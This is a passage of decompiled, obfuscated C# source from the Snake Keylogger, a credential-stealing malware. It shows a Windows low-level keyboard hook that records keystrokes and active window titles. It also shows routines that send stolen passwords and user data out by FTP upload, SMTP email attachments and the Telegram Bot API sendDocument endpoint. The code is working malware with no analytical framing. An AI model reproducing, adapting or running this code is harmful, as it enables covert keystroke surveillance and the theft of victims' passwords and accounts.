          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = ջô\uFFFDܣƚ.\u0306\u005E\uFFFDΑ蠺("PW | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n" + ջô\uFFFDܣƚ.뜸Ò\uFFFD\uFFFDŧ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------", ջô\uFFFDܣƚ.ɇհִӓב);
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + ջô\uFFFDܣƚ.\uFFFDşӤ2ٵ + "/sendDocument?chat_id=" + ջô\uFFFDܣƚ.Ŕޤ\u26CA\u05C3հ + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          ջô\uFFFDܣƚ.i\u02E8R鈟\uFFFD("SnakePW" + ջô\uFFFDܣƚ.\u1CFCœݝִױ, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static byte[] \u0655\u005E\uFFFDiē() => Encoding.Unicode.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n" + ջô\uFFFDܣƚ.뜸Ò\uFFFD\uFFFDŧ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");

    public static byte[] 콪Ԍל\uFFFDհ() => Encoding.Default.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n" + ջô\uFFFDܣƚ.뜸Ò\uFFFD\uFFFDŧ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");

    public static void Թ\u061D\uFFFDҟŚ()
    {
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (ջô\uFFFDܣƚ.ҭAױå\uFFFD + 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Name + " - Passwords ID - "), ջô\uFFFDܣƚ.䇹Ɖôأʓ), (object) ջô\uFFFDܣƚ.\u1CFCœݝִױ)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(ջô\uFFFDܣƚ.丐\uFFFD\u061D\uFFFD鈟, ջô\uFFFDܣƚ.ҡ\uFFFDҏۨɇ);
          byte[] bytes = Encoding.UTF8.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n" + ջô\uFFFDܣƚ.뜸Ò\uFFFD\uFFFDŧ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(ջô\uFFFDܣƚ.\uDAE4\uDED3\u07B8\uFFFD\uFFFD);
          message.To.Add(ջô\uFFFDܣƚ.\u061D\uFFFD\u0089븤ε);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          byte[] buffer1 = ջô\uFFFDܣƚ.\u0655\u005E\uFFFDiē();
          byte[] buffer2 = ջô\uFFFDܣƚ.콪Ԍל\uFFFDհ();
          MemoryStream contentStream1 = new MemoryStream(buffer1);
          MemoryStream contentStream2 = new MemoryStream(buffer2);
          message.Attachments.Add(new Attachment((Stream) contentStream1, "Passwords" + ջô\uFFFDܣƚ.\u1CFCœݝִױ, "text/plain"));
          message.Attachments.Add(new Attachment((Stream) contentStream2, "User" + ջô\uFFFDܣƚ.\u1CFCœݝִױ, "text/plain"));
          new SmtpClient(ջô\uFFFDܣƚ.W\u2964\uFFFD̲؜)
          {
            EnableSsl = (Operators.CompareString(ջô\uFFFDܣƚ.کεҚ蠺Ц, "True", false) == 0),
            Port = Conversions.ToInteger(ջô\uFFFDܣƚ.ζڿŚŎ\uFFFD),
            Credentials = ((ICredentialsByHost) new NetworkCredential(ջô\uFFFDܣƚ.\uDAE4\uDED3\u07B8\uFFFD\uFFFD, ջô\uFFFDܣƚ.\u061DƉŲ\uFFFDꓞ))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = "PW | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n" + ջô\uFFFDܣƚ.뜸Ò\uFFFD\uFFFDŧ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------";
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + ջô\uFFFDܣƚ.\uFFFDşӤ2ٵ + "/sendDocument?chat_id=" + ջô\uFFFDܣƚ.Ŕޤ\u26CA\u05C3հ + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          ջô\uFFFDܣƚ.i\u02E8R鈟\uFFFD("SnakePW" + ջô\uFFFDܣƚ.\u1CFCœݝִױ, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    private static void \uFFFD̲2\uFFFDj(object _param0, EventArgs ӛӚבşڿ)
    {
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (ջô\uFFFDܣƚ.ҭAױå\uFFFD + 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Name + " - Passwords ID - "), ջô\uFFFDܣƚ.䇹Ɖôأʓ), (object) ջô\uFFFDܣƚ.\u1CFCœݝִױ)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(ջô\uFFFDܣƚ.丐\uFFFD\u061D\uFFFD鈟, ջô\uFFFDܣƚ.ҡ\uFFFDҏۨɇ);
          byte[] bytes = Encoding.UTF8.GetBytes("PW | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n" + ջô\uFFFDܣƚ.뜸Ò\uFFFD\uFFFDŧ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "$%SMTPDV$", false) == 0)
      {
        try
        {
          MailMessage message = new MailMessage();
          message.From = new MailAddress(ջô\uFFFDܣƚ.\uDAE4\uDED3\u07B8\uFFFD\uFFFD);
          message.To.Add(ջô\uFFFDܣƚ.\u061D\uFFFD\u0089븤ε);
          message.Subject = " Pc Name: " + Environment.UserName + " | Snake Keylogger";
          message.Body = "PW | " + Environment.UserName + " | Snake\r\n\r\n\r\n";
          byte[] buffer1 = ջô\uFFFDܣƚ.\u0655\u005E\uFFFDiē();
          byte[] buffer2 = ջô\uFFFDܣƚ.콪Ԍל\uFFFDհ();
          MemoryStream contentStream1 = new MemoryStream(buffer1);
          MemoryStream contentStream2 = new MemoryStream(buffer2);
          message.Attachments.Add(new Attachment((Stream) contentStream1, "Passwords" + ջô\uFFFDܣƚ.\u1CFCœݝִױ, "text/plain"));
          message.Attachments.Add(new Attachment((Stream) contentStream2, "User" + ջô\uFFFDܣƚ.\u1CFCœݝִױ, "text/plain"));
          new SmtpClient(ջô\uFFFDܣƚ.W\u2964\uFFFD̲؜)
          {
            EnableSsl = (Operators.CompareString(ջô\uFFFDܣƚ.کεҚ蠺Ц, "True", false) == 0),
            Port = Conversions.ToInteger(ջô\uFFFDܣƚ.ζڿŚŎ\uFFFD),
            Credentials = ((ICredentialsByHost) new NetworkCredential(ջô\uFFFDܣƚ.\uDAE4\uDED3\u07B8\uFFFD\uFFFD, ջô\uFFFDܣƚ.\u061DƉŲ\uFFFDꓞ))
          }.Send(message);
          message.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(ջô\uFFFDܣƚ.ϱӓ뫆اչ, "$%TelegramDv$", false) == 0)
      {
        try
        {
          string str1 = "PW | " + Environment.UserName + " | Snake\r\n" + ջô\uFFFDܣƚ.\u07B4\uFFFDʓK늻 + "\r\n" + ջô\uFFFDܣƚ.뜸Ò\uFFFD\uFFFDŧ + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------";
          ServicePointManager.Expect100Continue = false;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          string str2 = "https://api.telegram.org/bot" + ջô\uFFFDܣƚ.\uFFFDşӤ2ٵ + "/sendDocument?chat_id=" + ջô\uFFFDܣƚ.Ŕޤ\u26CA\u05C3հ + "&caption=" + (" Pc Name: " + Environment.UserName + " | Snake Keylogger\r\n\r\nPW | " + Environment.UserName + " | Snake\r\n\r\n\r\n");
          ջô\uFFFDܣƚ.i\u02E8R鈟\uFFFD("SnakePW" + ջô\uFFFDܣƚ.\u1CFCœݝִױ, "application/x-ms-dos-executable", str2, str1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public static object ƟӤ\u26CAջ\uFFFD()
    {
      DriveInfo[] drives = DriveInfo.GetDrives();
      int index = 0;
      long num;
      while (index < drives.Length)
      {
        DriveInfo driveInfo = drives[index];
        if (driveInfo.IsReady)
          checked { num += driveInfo.TotalSize; }
        checked { ++index; }
      }
      return (object) Conversions.ToString(checked ((long) Math.Round(unchecked ((double) num / 1048576.0 / 1024.0))));
    }

    public static void 똛\u00BE\u26CAӓ\u07B4()
    {
    }

    public static void \uFFFD퓜ﾭ\u1CFCϫ()
    {
    }

    public static void \uFFFD\u00BEȨ\uFFFDŔ()
    {
    }

    public static void \uFFFDթٕΑׁ()
    {
    }

    public static void \u0089\uFFFD\uFFFDا\u002D()
    {
    }

    public static void \uF0B9\uFFFDU皍똛()
    {
    }

    public static void \uFFFDᔖ\uD9EE\uDF63ô()
    {
    }

    public static void 늻mÒŔٕ()
    {
    }

    public static void ޗӓ̱\uFFFD\uFFFD()
    {
    }

    public static void \u0314Ңܹʓ䇹()
    {
    }

    public static void ک皍\uFFFDŴׁ()
    {
    }

    public static void ԜЅУ\uFFFDR()
    {
    }

    public static void թų콪츠̔()
    {
    }

    public static void \u06DAׁۚ\uFFFD\uFFFD()
    {
      try
      {
        ջô\uFFFDܣƚ.\uFFFDi\uFFFD\u002Dܪ.Interval = 1;
        ջô\uFFFDܣƚ.\uFFFDi\uFFFD\u002Dܪ.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void t꼺ήגٵ()
    {
      try
      {
        ջô\uFFFDܣƚ.\u07B8̆ɮٷڿ();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void \uFFFDܪO\uFFFD똛()
    {
      try
      {
        ջô\uFFFDܣƚ.εζé\uFFFDک();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Ųz\uFFFDjҏ()
    {
    }

    public static void չӺ̮\u0089թ()
    {
    }

    public static void ɛɮ\uFFFDҭٵ()
    {
      if (Operators.ConditionalCompareObjectEqual(ջô\uFFFDܣƚ.ɢ\uFFFDҭܹ2, (object) "ProtectTrue", false))
      {
        if (Operators.CompareString(ջô\uFFFDܣƚ.뜸Ò\uFFFD\uFFFDŧ, "", false) == 0)
          return;
        ջô\uFFFDܣƚ.K븤Πިۨ();
        Thread.Sleep(8000);
        ջô\uFFFDܣƚ.\uFFFD\u05C3\uDA2C\uDE2Bݝ();
        Thread.Sleep(3000);
        ջô\uFFFDܣƚ.\uD95F\uDD04\uFFFD쐬ߟ();
        Thread.Sleep(3000);
        ջô\uFFFDܣƚ.\uFFFD쐬\u00BE\u07B4\uFFFD();
        Thread.Sleep(3000);
        ջô\uFFFDܣƚ.\uFFFD\uFFFDչK\uFFFD();
      }
      else if (Operators.CompareString(ջô\uFFFDܣƚ.뜸Ò\uFFFD\uFFFDŧ, "", false) != 0)
      {
        ջô\uFFFDܣƚ.Թ\u061D\uFFFDҟŚ();
        Thread.Sleep(8000);
        ջô\uFFFDܣƚ.ˤƉ\uFFFDÒų();
        Thread.Sleep(3000);
        ջô\uFFFDܣƚ.\uD95F\uDD04\uFFFD쐬ߟ();
        Thread.Sleep(3000);
        ջô\uFFFDܣƚ.\uFFFD쐬\u00BE\u07B4\uFFFD();
        Thread.Sleep(3000);
        ջô\uFFFDܣƚ.\uFFFD\uFFFDչK\uFFFD();
      }
    }

    public static void \uD95F\uDD04\uFFFD쐬ߟ()
    {
    }

    public static void \uFFFD쐬\u00BE\u07B4\uFFFD()
    {
    }

    public static void \uFFFD\uFFFDչK\uFFFD()
    {
    }

    public static void \uFFFD\u05C3\uDA2C\uDE2Bݝ()
    {
    }

    public static void ˤƉ\uFFFDÒų()
    {
    }

    [STAThread]
    public static void Main()
    {
      try
      {
        ջô\uFFFDܣƚ.\uFFFDթٕΑׁ();
        ջô\uFFFDܣƚ.똛\u00BE\u26CAӓ\u07B4();
        ջô\uFFFDܣƚ.\uFFFD\u00BEȨ\uFFFDŔ();
        ջô\uFFFDܣƚ.\u0089\uFFFD\uFFFDا\u002D();
        ջô\uFFFDܣƚ.\uF0B9\uFFFDU皍똛();
        ջô\uFFFDܣƚ.\uFFFDᔖ\uD9EE\uDF63ô();
        ջô\uFFFDܣƚ.ӛ̧恁Ϙ\uFFFD();
        ջô\uFFFDܣƚ.늻mÒŔٕ();
        ջô\uFFFDܣƚ.ޗӓ̱\uFFFD\uFFFD();
        ջô\uFFFDܣƚ.\u0314Ңܹʓ䇹();
        ջô\uFFFDܣƚ.ک皍\uFFFDŴׁ();
        ջô\uFFFDܣƚ.ԜЅУ\uFFFDR();
        ջô\uFFFDܣƚ.\uFFFD퓜ﾭ\u1CFCϫ();
        ջô\uFFFDܣƚ.թų콪츠̔();
        ջô\uFFFDܣƚ.t꼺ήגٵ();
        ջô\uFFFDܣƚ.\uFFFDܪO\uFFFD똛();
        ջô\uFFFDܣƚ.Ųz\uFFFDjҏ();
        \u06E8츠콪A\uFFFD.ޤ\u02F3ٚÒݶ();
        \u06E8츠콪A\uFFFD.اִ㹃ޗ\uFFFD();
        \u06E8츠콪A\uFFFD.䇹ԜӚߡ\uFFFD();
        \u06E8츠콪A\uFFFD.\uDAAE\uDDB5\uFFFD\uF0B9ݝ();
        \u06E8츠콪A\uFFFD.\uFFFD\uFFFDٵأ\u0385();
        \u06E8츠콪A\uFFFD.\u0333ִ̳鈇מ();
        \u06E8츠콪A\uFFFD.ŁٷCҚ皍();
        \u06E8츠콪A\uFFFD.\uFFFD\uFFFDWջų();
        \u06E8츠콪A\uFFFD.\uFFFD䕃ҏ\u02F3Ϙ();
        \u06E8츠콪A\uFFFD.Օ\uFFFDƟ\u002D\uFFFD();
        \u06E8츠콪A\uFFFD.ҭľܪ2Թ();
        \u06E8츠콪A\uFFFD.ʪϫ\uFFFDЮ뫆();
        \u06E8츠콪A\uFFFD.\uFFFD泮ҡJ恁();
        \u06E8츠콪A\uFFFD.\uD9D8\uDC9A泮ӥ\uFFFD();
        \u06E8츠콪A\uFFFD.Ѕ\u07B8AʓƜ();
        \u06E8츠콪A\uFFFD.ę\uFFFDҡҚ\uFFFD();
        \u06E8츠콪A\uFFFD.\u07C2̱\uFFFDۨϘ();
        \u06E8츠콪A\uFFFD.ǎ\uFFFD꼺\uFFFDɮ();
        \u06E8츠콪A\uFFFD.ēή恁åی();
        \u06E8츠콪A\uFFFD.\u0089̳ҏŴ̆();
        \u06E8츠콪A\uFFFD.ƚUЦӚמ();
        \u06E8츠콪A\uFFFD.Ŵ\u07BBΩ\uFFFDҏ();
        \u06E8츠콪A\uFFFD.Ӻ㹃嵱\uFFFD\u0026();
        \u06E8츠콪A\uFFFD.盀ݝ\uFFFD\u005E\uFFFD();
        \u06E8츠콪A\uFFFD.\uFFFDĂչﾭ\uFFFD();
        \u06E8츠콪A\uFFFD.ų\u060Cأ\uFFFDܹ();
        \u06E8츠콪A\uFFFD.ƚ丐\uFFFDW\uFFFD();
        \u06E8츠콪A\uFFFD.іޗ؜븤չ();
        \u06E8츠콪A\uFFFD.Ѕ\uFFFDʪƉŲ();
        \u06E8츠콪A\uFFFD.\uFFFDֵמٗ丐();
        \u06E8츠콪A\uFFFD.Уᔖߡ\u07FBթ();
        \u06E8츠콪A\uFFFD.츠ӥƉʓՕ();
        \u06E8츠콪A\uFFFD.ݝŁݝױϘ();
        \u06E8츠콪A\uFFFD.ޤמک\uFFFDչ();
        \u06E8츠콪A\uFFFD.\uD9EE\uDC9Am̀蠺();
        \u06E8츠콪A\uFFFD.é̳츠̔ҟ();
        \u06E8츠콪A\uFFFD.ãިչɇ盀();
        \u06E8츠콪A\uFFFD.ҡ\uFFFD똛Ŵņ();
        \u06E8츠콪A\uFFFD.ӤôƟ\u0385\u061D();
        \u06E8츠콪A\uFFFD.\uFFFDӛ\uFFFD\uFFFD䇹();
        \u06E8츠콪A\uFFFD.Մک퓜ߡ\uFFFD();
        \u06E8츠콪A\uFFFD.ƟӺ\uFFFD\u0609հ();
        \u06E8츠콪A\uFFFD.ε\u0097ή늻ɮ();
        \u06E8츠콪A\uFFFD.\u002DᔖԌﾭ̆();
        \u06E8츠콪A\uFFFD.Wٕ꾯Śב();
        \u06E8츠콪A\uFFFD.\u1CFCœήҟ\uFFFD();
        \u06E8츠콪A\uFFFD.ɮٗ\uFFFDéA();
        \u06E8츠콪A\uFFFD.\uFFFDZ\uFFFD\uFFFD恁();
        \u06E8츠콪A\uFFFD.\u2964\u058F\uFFFDŔľ();
        \u06E8츠콪A\uFFFD.\uFFFDҭ똛\uFFFDҟ();
        \u06E8츠콪A\uFFFD.åKԌƜœ();
        \u06E8츠콪A\uFFFD.\u002D泮ΠٷՕ();
        퓜\uFFFDܹ\u00ABc.Ăڿ\uFFFD\uFFFD߂();
        퓜\uFFFDܹ\u00ABc.\u07A8ۣΑ븤ņ();
        퓜\uFFFDܹ\u00ABc.O\u0385㠰뫆늻();
        퓜\uFFFDܹ\u00ABc.ľ\uFFFDRٕé();
        퓜\uFFFDܹ\u00ABc.\uFFFDJ\uFFFD\uFFFDJ();
        퓜\uFFFDܹ\u00ABc.ӛή\uFFFD\uFFFD\uFFFD();
        퓜\uFFFDܹ\u00ABc.盀蠺\uFFFDBꓞ();
        퓜\uFFFDܹ\u00ABc.\u07B4Jζʓ̧();
        퓜\uFFFDܹ\u00ABc.ӛ\uFFFDҡήՄ();
        퓜\uFFFDܹ\u00ABc.ٵ뜸ٷZ꾯();
        ջô\uFFFDܣƚ.չӺ̮\u0089թ();
        ջô\uFFFDܣƚ.ɛɮ\uFFFDҭٵ();
        Application.Run();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public delegate void KeyLoggerEventArgsEventHandler(
      object sender,
      ջô\uFFFDܣƚ.KeyLoggerEventArgs e);

    public class KeyLoggerEventArgs : EventArgs
    {
      private Keys _keys;
      private string _stringValue;

      public KeyLoggerEventArgs(Keys key, string stringValue)
      {
        this._keys = key;
        this._stringValue = stringValue;
      }

      public Keys Key => this._keys;

      public string StringValue => this._stringValue;
    }

    public class KeyLogger : IDisposable
    {
      private ջô\uFFFDܣƚ.KeyLogger.KeyboardProc _hookCallback;
      private IntPtr _hook;
      private string _currentWindow;
      private bool _newWindow;

      [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern IntPtr SetHook(
        int hook,
        ջô\uFFFDܣƚ.KeyLogger.KeyboardProc KeyDelegate,
        IntPtr HMod,
        int ThreadId);

      [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int CallNextHook(IntPtr hook, int code, int direction, ref Keys key);

      [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int UnHook(IntPtr hook);

      public event ջô\uFFFDܣƚ.KeyLoggerEventArgsEventHandler KeyDown;

      public event ջô\uFFFDܣƚ.KeyLoggerEventArgsEventHandler KeyUp;

      public string CurrentWindow => this._currentWindow;

      public KeyLogger()
      {
        this._hookCallback = new ջô\uFFFDܣƚ.KeyLogger.KeyboardProc(this.ProcessKey);
        this._hook = ջô\uFFFDܣƚ.KeyLogger.SetHook(13, this._hookCallback, IntPtr.Zero, 0);
        if (!(this._hook == IntPtr.Zero))
          ;
        this.InitializeCaptionLogging();
      }

      private int ProcessKey(int code, int direction, ref Keys key)
      {
        if (code == 0)
        {
          if (direction == 256)
          {
            // ISSUE: reference to a compiler-generated field
            ջô\uFFFDܣƚ.KeyLoggerEventArgsEventHandler keyDownEvent = this.KeyDownEvent;
            if (keyDownEvent != null)
              keyDownEvent((object) this, new ջô\uFFFDܣƚ.KeyLoggerEventArgs(key, this.Identifykey(key)));
          }
          else if (direction == 260)
          {
            // ISSUE: reference to a compiler-generated field
            ջô\uFFFDܣƚ.KeyLoggerEventArgsEventHandler keyUpEvent = this.KeyUpEvent;
            if (keyUpEvent != null)
              keyUpEvent((object) this, new ջô\uFFFDܣƚ.KeyLoggerEventArgs(key, this.Identifykey(key)));
          }
        }
        return ջô\uFFFDܣƚ.KeyLogger.CallNextHook(this._hook, code, direction, ref key);
      }

      private string Identifykey(Keys k)
      {
        bool flag = 恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Keyboard.ShiftKeyDown;
        if (恁\uFFFD\uFFFDAô.㠰\uFFFD\uFFFD\uFFFD\uFFFD.Keyboard.CapsLock)
          flag = !flag;
        string str;
        try
        {
          switch (k)
          {
            case Keys.Back:
            case Keys.End:
            case Keys.Delete:
            case Keys.F1:
            case Keys.F2:
            case Keys.F3:
            case Keys.F4:
            case Keys.F5:
            case Keys.F6:
            case Keys.F7:
            case Keys.F8:
            case Keys.F9:
            case Keys.F10:
            case Keys.F11:
            case Keys.F12:
              str = "[" + k.ToString() + "]";
              break;
            case Keys.Tab:
              str = "[TAP]";
              break;
            case Keys.Return:
              str = "[ENTR]";
              break;
            case Keys.Space:
              str = " ";
              break;
            default:
              str = !flag ? this.VKCodeToUnicode(checked ((uint) k)) : this.VKCodeToUnicode(checked ((uint) k)).ToUpper();
              break;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          if (flag)
          {
            str = Strings.ChrW((int) k).ToString().ToUpper();
            ProjectData.ClearProjectError();
          }
          else
          {
            str = Strings.ChrW((int) k).ToString().ToLower();
            ProjectData.ClearProjectError();
          }
        }
        return str;
      }

      private string VKCodeToUnicode(uint VKCode)
      {
        try
        {
          StringBuilder stringBuilder = new StringBuilder();
          byte[] numArray = new byte[(int) byte.MaxValue];
          if (!ջô\uFFFDܣƚ.늻ܣٗW2(numArray))
            return "";
          uint num1 = ջô\uFFFDܣƚ.ی\u060Cɛɢˤ(VKCode, 0U);
          IntPtr 퓜Π뜸ƌ̳ = ջô\uFFFDܣƚ.Īӓ\u07FBܣЮ();
          int ҭڿמŎʓ = 0;
          IntPtr num2 = (IntPtr) ջô\uFFFDܣƚ.Śt\uFFFD恁\uFFFD(ջô\uFFFDܣƚ.ҏJήôÒ(퓜Π뜸ƌ̳, ref ҭڿמŎʓ));
          ջô\uFFFDܣƚ.\uFFFD\uFFFD\uFFFDj㠰(VKCode, num1, numArray, stringBuilder, 5, 0U, num2);
          return stringBuilder.ToString();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        return ((Keys) checked ((int) VKCode)).ToString();
      }

      private void InitializeCaptionLogging() => new Thread((ThreadStart) (() =>
      {
        while (true)
        {
          StringBuilder stringBuilder = new StringBuilder(256);
          if (ջô\uFFFDܣƚ.똛\uFFFDݝ鈇\u0089(ջô\uFFFDܣƚ.Īӓ\u07FBܣЮ(), stringBuilder, 256) > 0 && Operators.CompareString(stringBuilder.ToString(), this._currentWindow, false) != 0)
            this._currentWindow = stringBuilder.ToString();
          Thread.Sleep(1000);
        }
      })).Start();

      public void Dispose()
      {
        ջô\uFFFDܣƚ.KeyLogger.UnHook(this._hook);
        GC.SuppressFinalize((object) this);
      }

      private delegate int KeyboardProc(int code, int direction, ref Keys key);
    }
  }
}
